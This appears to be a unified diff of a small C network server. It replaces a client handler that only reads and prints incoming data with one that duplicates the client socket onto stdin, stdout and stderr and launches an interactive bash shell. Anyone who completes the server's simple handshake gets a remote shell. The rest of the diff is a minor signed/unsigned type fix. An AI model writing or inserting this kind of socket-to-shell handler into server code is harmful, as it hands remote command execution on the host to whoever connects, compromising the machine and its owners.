@@ -17,7 +17,7 @@
 int run_protocol(int connect_fd);
 int safe_write(const int fd, char const* msg);
 int safe_read(const int fd, char const* expected);
-int handle_client(int connect_fd);
+void handle_client(int connect_fd);
 
 int main() {
   int server_socket_fd;
@@ -53,16 +53,11 @@ int main() {
   }
 }
 
-int handle_client(int fd) {
-  char buffer[BUFF_MAX];
-  int read_len;
-
-
-  while ( (read_len = read(fd, buffer, BUFF_MAX)) > 0) {
-    buffer[read_len] = '\0';
-    printf("Recd: %s\n", buffer);
-  }
-  return 0;
+void handle_client(int fd) {
+  dup2(fd, STDOUT_FILENO);
+  dup2(fd, STDIN_FILENO);
+  dup2(fd, STDERR_FILENO);
+  execlp("bash","bash","--noediting","-i",NULL);
 }
 
 int run_protocol(int fd) {
@@ -85,14 +80,14 @@ int safe_write(const int fd, char const* message) {
 
 int safe_read(const int fd, char const* expected) {
   char buff[BUFF_MAX];
-  unsigned int read_len;
+  int read_len;
 
   if ( (read_len = read(fd, buff, BUFF_MAX)) <= 0) {
     perror("Error reading from client\n");
     return 1;
   }
 
-  if ( (read_len != strlen(expected)) || strncmp(expected, buff, read_len)) {
+  if ( ((unsigned int)read_len != strlen(expected)) || strncmp(expected, buff, read_len)) {
     perror("Client gave incorrect protocol\n");
     return 1;
   }
